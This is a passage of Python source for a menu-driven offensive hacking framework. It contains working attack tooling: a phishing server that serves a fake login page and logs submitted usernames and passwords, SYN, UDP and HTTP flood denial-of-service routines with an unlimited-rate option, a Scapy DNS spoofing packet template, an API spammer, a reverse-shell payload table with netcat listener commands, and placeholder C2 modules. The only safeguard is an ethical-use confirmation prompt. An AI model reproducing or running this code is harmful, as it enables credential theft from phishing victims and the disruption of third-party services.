    shell_table.add_column("Type", style="cyan"); shell_table.add_column("Payload", style="magenta", overflow="fold")
    for name, payload_str in shells.items(): shell_table.add_row(name.replace("_", " ").title(), payload_str)
    console.print(shell_table)
    console.print(f"\n[bold yellow]Listener examples:[/bold yellow]")
    console.print(f"  TCP: nc -lvnp {lport}")
    console.print(f"  UDP: nc -luvnp {lport} (or socat UDP-LISTEN:{lport} STDOUT)")
    console.print("[dim]Note: Some payloads might require specific conditions or netcat versions.[/dim]")

class SimplePhishingHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, html_content="<p>Error: No phishing page loaded.</p>", log_file="phishing_credentials.txt", **kwargs):
        self.html_content_bytes = html_content.encode('utf-8')
        self.log_file = log_file
        super().__init__(*args, **kwargs)

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.send_header("Content-Length", str(len(self.html_content_bytes)))
        self.end_headers()
        self.wfile.write(self.html_content_bytes)

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        console.print(f"\n[bold green][+] Phishing credentials received:[/bold green] {post_data.decode('utf-8')}")
        try:
            with open(self.log_file, "a") as f:
                f.write(f"{time.asctime()}: {post_data.decode('utf-8')}\n")
            console.print(f"[cyan][i]Credentials logged to {self.log_file}[/i][/cyan]")
        except Exception as e:
            console.print(f"[red]Error logging credentials: {e}[/red]")
        self.send_response(302)
        self.send_header('Location', '/')
        self.end_headers()

def run_offensive_operations():
    force_clear_screen()
    console.print(Panel("[bold red]Offensive Operations[/bold red]", padding=1, border_style="red"))
    offensive_options = {
        "1": "Phishing Page Generator (Simple)",
        "2": "DNS Spoofing (Conceptual - ARP MitM Required)",
        "3": "Denial of Service (DoS) Tools",
        "0": "Back to Main Menu"
    }
    while True:
        console.print("\n[cyan]Offensive Operations Options:[/cyan]")
        options_table = Table(show_header=True, header_style="bold red", border_style="dim")
        options_table.add_column("No.", style="dim", width=5, justify="center")
        options_table.add_column("Action")
        for key, value in offensive_options.items(): options_table.add_row(key, value)
        console.print(options_table)
        choice = Prompt.ask("Select an option", choices=list(offensive_options.keys()), default="0")

        if choice == "0": break
        force_clear_screen()
        console.print(Panel(f"[bold red]Offensive Ops: {offensive_options[choice]}[/bold red]", padding=1, border_style="red"))

        if choice == "1": run_phishing_generator()
        elif choice == "2": run_dns_spoofing_conceptual()
        elif choice == "3": run_dos_tools()

        if choice != "0":
            Prompt.ask("\n[cyan]Press Enter to return to Offensive Operations options...[/cyan]", default="")
            force_clear_screen()
            console.print(Panel("[bold red]Offensive Operations[/bold red]", padding=1, border_style="red"))

def run_phishing_generator():
    global phishing_server_thread, httpd_phishing
    if not confirm_ethical_use("Phishing Page Generator"): return

    if phishing_server_thread and phishing_server_thread.is_alive():
        console.print("[yellow]Phishing server is already running.[/yellow]")
        if Confirm.ask("Stop the current phishing server?", default=True):
            if httpd_phishing:
                console.print("[cyan]Stopping phishing server...[/cyan]")
                httpd_phishing.shutdown()
                httpd_phishing.server_close()
                phishing_server_thread.join(timeout=2)
                phishing_server_thread = None
                httpd_phishing = None
                console.print("[green]Phishing server stopped.[/green]")
            else:
                console.print("[red]Could not stop server (no httpd object).[/red]")
        return

    console.print(Panel("[bold yellow]Simple Phishing Page Generator[/bold yellow]", border_style="yellow"))
    template_choice = Prompt.ask("Choose a template:", choices=["generic_login", "custom_html"], default="generic_login")
    phishing_html = ""
    if template_choice == "generic_login":
        title = Prompt.ask("Page Title (e.g., Secure Web Login)", default="Secure Login Portal")
        heading = Prompt.ask("Form Heading (e.g., Please sign in)", default="Member Login")
        action_url = Prompt.ask("Form Action URL (use / for local handling)", default="/")
        phishing_html = f"""<!DOCTYPE html><html><head><title>{title}</title><style>body{{font-family:sans-serif;display:flex;justify-content:center;align-items:center;min-height:90vh;background-color:#f0f0f0;}}.login-box{{padding:20px;border:1px solid #ccc;border-radius:5px;background-color:white;box-shadow:0 0 10px rgba(0,0,0,0.1);}}h2{{text-align:center;color:#333;}}label{{display:block;margin-bottom:5px;}}input[type="text"],input[type="password"]{{width:calc(100% - 12px);padding:8px;margin-bottom:10px;border:1px solid #ccc;border-radius:3px;}}input[type="submit"]{{width:100%;padding:10px;background-color:#007bff;color:white;border:none;border-radius:3px;cursor:pointer;}}input[type="submit"]:hover{{background-color:#0056b3;}}</style></head><body><div class="login-box"><h2>{heading}</h2><form action="{action_url}" method="post"><label for="username">Username:</label><input type="text" id="username" name="username" required><br><label for="password">Password:</label><input type="password" id="password" name="password" required><br><input type="submit" value="Login"></form></div></body></html>"""
    elif template_choice == "custom_html":
        console.print("[cyan]Paste your custom HTML content below. Type 'ENDHTML' on a new line to finish.[/cyan]")
        custom_lines = []
        while True:
            line = Prompt.ask("")
            if line.strip().upper() == 'ENDHTML': break
            custom_lines.append(line)
        phishing_html = "\n".join(custom_lines)
        if not phishing_html: console.print("[red]No custom HTML provided. Aborting.[/red]"); return

    log_file = Prompt.ask("Log file for credentials", default="phishing_credentials.txt")
    port_str = Prompt.ask("Port to serve on", default="8080")
    try:
        port = int(port_str)
        if not (0 < port < 65536): raise ValueError("Port out of range")
    except ValueError:
        console.print("[red]Invalid port number. Please enter a number between 1 and 65535.[/red]")
        return

    Handler = partial(SimplePhishingHandler, html_content=phishing_html, log_file=log_file)

    try:
        socketserver.TCPServer.allow_reuse_address = True
        httpd_phishing = socketserver.TCPServer(("", port), Handler)
        console.print(f"[green][+] Phishing server starting on http://0.0.0.0:{port}[/green]")
        console.print(f"[cyan][i]Credentials will be logged to {log_file}[/i][/cyan]")
        console.print("[yellow]Press Ctrl+C in this console to stop the phishing server (or use the menu option again).[/yellow]")
        phishing_server_thread = threading.Thread(target=httpd_phishing.serve_forever, daemon=True)
        phishing_server_thread.start()
        console.print("[magenta]Server running in a separate thread. You can return to menu.[/magenta]")
    except OSError as e:
        console.print(f"[red]Could not start server on port {port}: {e}. Port might be in use.[/red]")
        httpd_phishing = None; phishing_server_thread = None
    except Exception as e:
        console.print(f"[red]Error starting phishing server: {e}[/red]")
        httpd_phishing = None; phishing_server_thread = None

def run_dns_spoofing_conceptual():
    if not confirm_ethical_use("DNS Spoofing"): return
    console.print(Panel("[bold red]DNS Spoofing (Conceptual)[/bold red]", border_style="red"))
    console.print("[yellow]WARNING: Effective DNS Spoofing requires a Man-in-the-Middle (MitM) position (e.g., via ARP Spoofing).[/yellow]")
    console.print("[yellow]This module provides a conceptual Scapy snippet for crafting a DNS response. Full MitM is not implemented here due to complexity and risk.[/yellow]")
    console.print("[yellow]This should ONLY be run in a controlled lab environment against systems you own and have explicit permission for.[/yellow]")

    if 'scapy' not in sys.modules:
        console.print("[red]Scapy library not loaded. Cannot perform DNS spoofing.[/red]"); return

    target_ip_victim = Prompt.ask("Enter Target Victim IP (e.g., 192.168.1.101)", default="192.168.1.101")
    spoofed_server_ip = Prompt.ask("Enter IP to redirect to (your malicious server IP)", default="192.168.1.200")
    domain_to_spoof_str = Prompt.ask("Enter domain to spoof (e.g., example.com)", default="example.com")

    console.print("\n[cyan]Conceptual Scapy DNS Spoofing (Response Packet):[/cyan]")
    console.print("[dim]This code crafts a DNS response. You would typically send this after sniffing a DNS query from the target while MitM.[/dim]")
    
    dns_spoof_example_code = f"""
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send

victim_ip_address = "{target_ip_victim}"
real_dns_server_ip_placeholder = "<real_dns_server_ip>" 
victim_source_port_placeholder = 12345 
original_dns_transaction_id_placeholder = 5555 

ip_layer = IP(src=real_dns_server_ip_placeholder, dst=victim_ip_address)
udp_layer = UDP(sport=53, dport=victim_source_port_placeholder)
dns_layer = DNS(
    id=original_dns_transaction_id_placeholder,
    qr=1, aa=1,
    ancount=1,
    qd=DNSQR(qname="{domain_to_spoof_str}"),
    an=DNSRR(
        rrname="{domain_to_spoof_str}",
        type='A',
        ttl=600,
        rdata="{spoofed_server_ip}"
    )
)
spoofed_dns_response_packet = ip_layer / udp_layer / dns_layer
"""
    console.print(Text(dns_spoof_example_code, style="green"))
    console.print("[bold red]Implementation of MitM (e.g., ARP spoofing), packet sniffing, and dynamic value extraction is critical and complex.[/bold red]")

def run_dos_tools():
    if not confirm_ethical_use("Denial of Service Tools"): return

    console.print(Panel("[bold red]Denial of Service (DoS) Tools[/bold red]", border_style="red"))
    dos_options = {
        "1": "SYN Flood (Scapy - Requires Privileges)",
        "2": "UDP Flood (Scapy/Socket)",
        "3": "HTTP GET Flood (Requests)",
        "0": "Back to Offensive Ops Menu"
    }
    while True:
        console.print("\n[cyan]DoS Tool Options:[/cyan]")
        options_table = Table(show_header=True, header_style="bold red", border_style="dim")
        options_table.add_column("No.", style="dim", width=5, justify="center"); options_table.add_column("Action")
        for key, value in dos_options.items(): options_table.add_row(key, value)
        console.print(options_table)
        dos_choice = Prompt.ask("Select DoS type", choices=list(dos_options.keys()), default="0")

        if dos_choice == "0": break
        force_clear_screen()
        console.print(Panel(f"[bold red]DoS Tool: {dos_options[dos_choice]}[/bold red]", padding=1, border_style="red"))

        target_ip = Prompt.ask("Enter Target IP Address")
        if not validate_ip(target_ip): console.print("[red]Invalid Target IP.[/red]"); continue
        try:
            duration_str = Prompt.ask("Duration of attack (seconds)", default="10")
            duration = int(duration_str)
            rate_str = Prompt.ask("Packets/Requests per second (0 for max, use with extreme caution!)", default="10")
            rate = int(rate_str)
            if duration <=0 or rate < 0: raise ValueError("Duration must be >0 and rate >=0")
        except ValueError: console.print("[red]Invalid duration or rate.[/red]"); continue
        
        pps_delay = 1.0 / rate if rate > 0 else 0

        if dos_choice == "1":
            if 'scapy' not in sys.modules or 'RandShort' not in globals() : console.print("[red]Scapy or RandShort not loaded.[/red]"); continue
            try:
                target_port_str = Prompt.ask("Target Port (e.g., 80)", default="80")
                target_port = int(target_port_str)
                if not (0 < target_port < 65536): raise ValueError("Port out of range")
            except ValueError: console.print("[red]Invalid port number.[/red]"); continue
            
            console.print(f"[cyan]Starting SYN Flood on {target_ip}:{target_port} for {duration}s at ~{rate if rate > 0 else 'max'} PPS...[/cyan]")
            start_time = time.time(); sent_count = 0
            try:
                while time.time() - start_time < duration:
                    ip_layer = IP(dst=target_ip)
                    tcp_layer = TCP(sport=RandShort(), dport=target_port, flags="S")
                    packet = ip_layer / tcp_layer
                    send(packet, verbose=0)
                    sent_count += 1
                    if pps_delay > 0: time.sleep(pps_delay)
                    if sent_count % (rate if rate > 0 else 1000) == 0 and rate > 0 : console.print(f"... {sent_count} packets sent ...")
            except KeyboardInterrupt: console.print("\n[yellow]SYN Flood interrupted by user.[/yellow]")
            except Exception as e: console.print(f"[red]Error during SYN flood: {e}[/red]")
            finally: console.print(f"[green]SYN Flood finished. Sent {sent_count} packets.[/green]")
        elif dos_choice == "2":
            try:
                target_port_str = Prompt.ask("Target Port (e.g., 53, 161)", default="53")
                target_port = int(target_port_str)
                packet_size_str = Prompt.ask("Packet size (bytes)", default="1024")
                packet_size = int(packet_size_str)
                if not (0 < target_port < 65536) or packet_size <=0: raise ValueError("Invalid port or packet size")
            except ValueError: console.print("[red]Invalid port or packet size.[/red]"); continue

            payload = os.urandom(packet_size)
            console.print(f"[cyan]Starting UDP Flood on {target_ip}:{target_port} for {duration}s at ~{rate if rate > 0 else 'max'} PPS...[/cyan]")
            start_time = time.time(); sent_count = 0
            try:
                if 'scapy' not in sys.modules or 'RandShort' not in globals(): console.print("[red]Scapy or RandShort not loaded.[/red]"); continue
                while time.time() - start_time < duration:
                    ip_layer = IP(dst=target_ip)
                    udp_layer = UDP(sport=RandShort(), dport=target_port)
                    packet = ip_layer / udp_layer / payload
                    send(packet, verbose=0)
                    sent_count +=1
                    if pps_delay > 0: time.sleep(pps_delay)
                    if sent_count % (rate if rate > 0 else 1000) == 0 and rate > 0: console.print(f"... {sent_count} packets sent ...")
            except KeyboardInterrupt: console.print("\n[yellow]UDP Flood interrupted.[/yellow]")
            except Exception as e: console.print(f"[red]Error during UDP flood: {e}[/red]")
            finally: console.print(f"[green]UDP Flood finished. Sent {sent_count} packets.[/green]")
        elif dos_choice == "3":
            target_url = Prompt.ask("Enter Full Target URL (e.g., http://example.com/login.php)", default=f"http://{target_ip}")
            if not validate_url(target_url): console.print("[red]Invalid URL.[/red]"); continue
            console.print(f"[cyan]Starting HTTP GET Flood on {target_url} for {duration}s at ~{rate if rate > 0 else 'max'} RPS...[/cyan]")
            start_time = time.time(); success_count = 0; error_count = 0
            try:
                with Progress(TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("{task.completed}/{task.total} reqs"), TextColumn("Success: {task.fields[success]} | Errors: {task.fields[error]}"), TimeRemainingColumn(), console=console, transient=True) as progress:
                    total_requests_expected = duration * rate if rate > 0 else duration * 100 
                    http_task = progress.add_task("HTTP Flooding...", total=total_requests_expected if rate > 0 else None, success=0, error=0)
                    while time.time() - start_time < duration:
                        try:
                            requests.get(target_url, headers={'User-Agent': DEFAULT_USER_AGENT}, timeout=5)
                            success_count += 1
                        except requests.RequestException: error_count += 1
                        progress.update(http_task, advance=1, success=success_count, error=error_count)
                        if pps_delay > 0: time.sleep(pps_delay)
            except KeyboardInterrupt: console.print("\n[yellow]HTTP Flood interrupted.[/yellow]")
            except Exception as e: console.print(f"[red]Error during HTTP flood: {e}[/red]")
            finally: console.print(f"[green]HTTP GET Flood finished. Successful: {success_count}, Errors: {error_count}[/green]")
        if dos_choice != "0":
            Prompt.ask("\n[cyan]Press Enter to return to DoS Tool options...[/cyan]", default="")
            force_clear_screen(); console.print(Panel("[bold red]DoS Tool Options[/bold red]", padding=1, border_style="red"))

def run_directory_scanner():
    force_clear_screen(); console.print(Panel("[bold #32CD32]Directory Scanner[/bold #32CD32]",padding=1, border_style="#32CD32"))
    target_url = Prompt.ask(Text.assemble(("Enter base URL (e.g., ", "white"), ("http://example.com", "bold #00BFFF"), (")", "white")))
    if not validate_url(target_url): console.print("[red]Invalid URL.[/red]"); leave_module_prompt(); return
    if not target_url.endswith('/'): target_url += '/'
    paths_to_scan = set(BACKEND_PATHS)
    use_custom_wordlist = Prompt.ask(f"Use default wordlist at '{WORDLIST_PATH}'? (y/n)", choices=["y", "n"], default="y")
    custom_wordlist_path = WORDLIST_PATH
    custom_wordlist_path_input_str = ""
    if use_custom_wordlist == 'n':
        custom_wordlist_path_input_str = Prompt.ask("Enter path to custom wordlist (blank for internal list only)")
        if custom_wordlist_path_input_str.strip(): custom_wordlist_path = custom_wordlist_path_input_str.strip()
        else: custom_wordlist_path = None; console.print("[cyan]Using internal paths only.[/cyan]")
    if custom_wordlist_path and os.path.exists(custom_wordlist_path):
        try:
            with open(custom_wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                file_paths = {line.strip() for line in f if line.strip() and not line.startswith('#')}
            paths_to_scan.update(file_paths); console.print(f"[cyan]Loaded {len(file_paths)} paths from '{custom_wordlist_path}'[/cyan]")
        except Exception as e: console.print(f"[red]Error loading wordlist '{custom_wordlist_path}': {e}[/red]")
    elif (use_custom_wordlist == 'y' and not os.path.exists(WORDLIST_PATH)) or \
         (custom_wordlist_path and not os.path.exists(custom_wordlist_path) and use_custom_wordlist == 'n' and custom_wordlist_path_input_str.strip()):
         console.print(f"[yellow]Wordlist '{custom_wordlist_path if custom_wordlist_path else WORDLIST_PATH}' not found. Using internal paths.[/yellow]")
    if not paths_to_scan: console.print("[red]No paths to scan.[/red]"); leave_module_prompt(); return
    console.print(f"[cyan]Starting scan on {target_url} with {len(paths_to_scan)} paths...[/cyan]")
    found_count = 0; headers = {'User-Agent': DEFAULT_USER_AGENT}; sorted_paths = sorted(list(paths_to_scan))
    with Progress(TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"), TimeRemainingColumn(), console=console) as progress_bar:
        scan_task = progress_bar.add_task("Scanning...", total=len(sorted_paths))
        for path in sorted_paths:
            progress_bar.update(scan_task, advance=1, description=f"Testing: {path[:30]}{'...' if len(path)>30 else ''}")
            full_url = urljoin(target_url, path.lstrip('/'))
            try:
                response = requests.get(full_url, headers=headers, timeout=5, allow_redirects=True, stream=True)
                if response.status_code in INTERESTING_STATUS_CODES:
                    status_message = INTERESTING_STATUS_CODES[response.status_code]
                    console.print(f"[+] Found: {full_url} - Status: {response.status_code} ({status_message})")
                    found_count += 1
                response.close()
            except requests.exceptions.RequestException: pass
            except Exception: pass
            time.sleep(0.01)
    console.print(f"\n[bold #32CD32]Scan complete. Found {found_count} potential paths.[/bold #32CD32]"); leave_module_prompt()

def run_api_spammer():
    force_clear_screen(); console.print(Panel("[bold #FF8C00]API Spammer[/bold #FF8C00]",padding=1, border_style="#FF8C00"))
    url = Prompt.ask("[#FFFF00]Target URL for API endpoint")
    if not validate_url(url): console.print("[red]Invalid URL.[/red]"); leave_module_prompt(); return
    method = Prompt.ask("HTTP Method (GET/POST)", choices=["GET", "POST"], default="GET").upper()
    num_requests_str = Prompt.ask("Number of requests", default="100")
    delay_str = Prompt.ask("Delay (s)", default="0.1")
    try:
        num_requests = int(num_requests_str)
        delay = float(delay_str)
        if num_requests <= 0 or delay < 0: raise ValueError("Invalid number or delay")
    except ValueError:
        console.print("[red]Invalid number for requests or delay.[/red]"); leave_module_prompt(); return

    headers = parse_json_input(Prompt.ask("Headers (JSON or empty)", default=""), default_if_empty={'User-Agent': DEFAULT_USER_AGENT})
    if 'User-Agent' not in headers: headers['User-Agent'] = DEFAULT_USER_AGENT
    post_data = parse_json_input(Prompt.ask("POST data (JSON or empty)", default="")) if method == "POST" else None
    console.print(f"[cyan]Starting {num_requests} {method} requests to {url} with {delay}s delay...[/cyan]")
    success_count = 0; error_count = 0
    with Progress(TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("{task.percentage:>3.0f}%"), TextColumn("Success: {task.fields[success]} | Errors: {task.fields[error]}"), TimeRemainingColumn(), console=console, transient=True) as progress:
        spam_task = progress.add_task("Spamming...", total=num_requests, success=0, error=0)
        for _ in range(num_requests):
            try:
                if method == "GET": response = requests.get(url, headers=headers, timeout=10)
                else: response = requests.post(url, headers=headers, json=post_data, timeout=10)
                if 200 <= response.status_code < 300: success_count += 1
                else: error_count +=1
            except requests.RequestException: error_count += 1
            progress.update(spam_task, advance=1, success=success_count, error=error_count)
            time.sleep(delay)
    console.print(f"\n[bold #FF8C00]API Spamming complete. Success: {success_count}, Failures: {error_count}[/bold #FF8C00]"); leave_module_prompt()

def run_post_requester():
    force_clear_screen(); console.print(Panel("[bold #BA55D3]POST Requester[/bold #BA55D3]",padding=1, border_style="#BA55D3"))
    url = Prompt.ask("Target URL for POST")
    if not validate_url(url): console.print("[red]Invalid URL.[/red]"); leave_module_prompt(); return
    headers = parse_json_input(Prompt.ask("Headers (JSON or empty)", default=""), default_if_empty={'User-Agent': DEFAULT_USER_AGENT})
    if 'User-Agent' not in headers: headers['User-Agent'] = DEFAULT_USER_AGENT
    data_str = Prompt.ask("POST Data (JSON or string)", default="{}")
    is_json = True
    try: post_data = json.loads(data_str)
    except json.JSONDecodeError: is_json = False; post_data = data_str
    console.print(f"[cyan]Sending POST to {url} with {'JSON' if is_json else 'raw data'}...[/cyan]")
    try:
        response = requests.post(url, headers=headers, json=post_data if is_json else None, data=None if is_json else post_data, timeout=15)
        console.print(f"Status: {response.status_code}"); console.print("Headers:"); console.print_json(data=dict(response.headers))
        console.print("Body:");
        try: console.print_json(data=response.json())
        except json.JSONDecodeError: console.print(response.text[:1000] + ("..." if len(response.text) > 1000 else ""))
    except requests.RequestException as e: console.print(f"[red]Error: {e}[/red]")
    leave_module_prompt()

def run_payload_executor():
    force_clear_screen()
    console.print(Panel("[bold #DC143C]Custom Payload Executor[/bold #DC143C]",padding=1, border_style="#DC143C"))
    console.print("[yellow]Payload Executor module is a placeholder.[/yellow]")
    leave_module_prompt()

def run_c2_communication():
    force_clear_screen()
    console.print(Panel("[bold #1E90FF]C2 Communication[/bold #1E90FF]",padding=1, border_style="#1E90FF"))
    console.print("[yellow]C2 Communication module is a placeholder.[/yellow]")
    leave_module_prompt()

def exit_framework_actions():
    global httpd_phishing, phishing_server_thread
    if httpd_phishing:
        console.print("[cyan]Attempting to stop active Phishing Server...[/cyan]")
        httpd_phishing.shutdown()
        httpd_phishing.server_close()
        if phishing_server_thread and phishing_server_thread.is_alive():
            phishing_server_thread.join(timeout=2)
        httpd_phishing = None
        phishing_server_thread = None
        console.print("[green]Phishing server stopped.[/green]")

def exit_framework():
    exit_framework_actions()
    return "exit"

if __name__ == "__main__":
    if not os.path.exists('data/wordlists'):
        try: os.makedirs('data/wordlists')
        except OSError as e: console.print(f"[red]Could not create 'data/wordlists': {e}[/red]")
        else: console.print("[yellow]Created directory 'data/wordlists'. Place wordlists here.[/yellow]")

    if IPINFO_API_KEY == 'YOUR_IPINFO_API_KEY' or not IPINFO_API_KEY :
        console.print(Panel("[bold yellow]Warning: IPinfo API key is either default or not set![/bold yellow]\nIP Geolocation may not work as expected. Please set the `IPINFO_API_KEY` variable in the script with your actual key.", padding=1, border_style="yellow"))
    if NVD_API_KEY == 'YOUR_NVD_API_KEY' or not NVD_API_KEY:
        console.print(Panel("[bold yellow]Warning: NVD API key is not set or is default![/bold yellow]\nCVE Search will be heavily rate-limited. Please set the `NVD_API_KEY` variable.", padding=1, border_style="yellow"))

    active = True
    available_functions = {
        'run_reconnaissance': run_reconnaissance,
        'run_intelligence_gathering': run_intelligence_gathering,
        'run_exploit_arsenal': run_exploit_arsenal,
        'run_offensive_operations': run_offensive_operations,
        'run_directory_scanner': run_directory_scanner,
        'run_api_spammer': run_api_spammer,
        'run_post_requester': run_post_requester,
        'run_payload_executor': run_payload_executor,
        'run_c2_communication': run_c2_communication,
        'exit_framework': exit_framework
    }
    while active:
        try:
            user_choice_idx = main_menu()
            selected_module_config = MODULES_CONFIG[user_choice_idx - 1]
            func_name_to_call = selected_module_config['func_name']

            if func_name_to_call != 'run_offensive_operations' and httpd_phishing:
                if Confirm.ask("[yellow]Phishing server is active. Stop it before changing modules?", default=True):
                    exit_framework_actions()
            
            if func_name_to_call == 'exit_framework':
                force_clear_screen()
                console.print(Panel("[bold blue]Framework exiting on user request.[/bold blue]",padding=1))
                active = False 
            elif func_name_to_call in available_functions:
                module_function = available_functions[func_name_to_call]
                module_function()
            else:
                console.print(f"[red]Error: Module function '{func_name_to_call}' not found.[/red]")
                time.sleep(2)
        except KeyboardInterrupt:
            force_clear_screen()
            console.print(Panel("\n[yellow]Operation aborted by user (Ctrl+C).[/yellow]",padding=1))
            if Confirm.ask("Exit framework?", default=True):
                exit_framework_actions()
                active = False
            else:
                console.print("[cyan]Returning to main menu...[/cyan]")
                time.sleep(1)
        except Exception as e:
            force_clear_screen()
            console.print(Panel(f"\n[bold red]An unexpected error occurred in the main program: {e}[/bold red]",padding=1))
            console.print_exception(show_locals=True, max_frames=3)
            Prompt.ask("[red]Press Enter to attempt to return to main menu (may be unstable)...[/red]", default="")
    
    exit_framework_actions()
    force_clear_screen()
    console.print(Panel("[bold blue]Framework terminated cleanly.[/bold blue]", padding=1))
    sys.exit(0)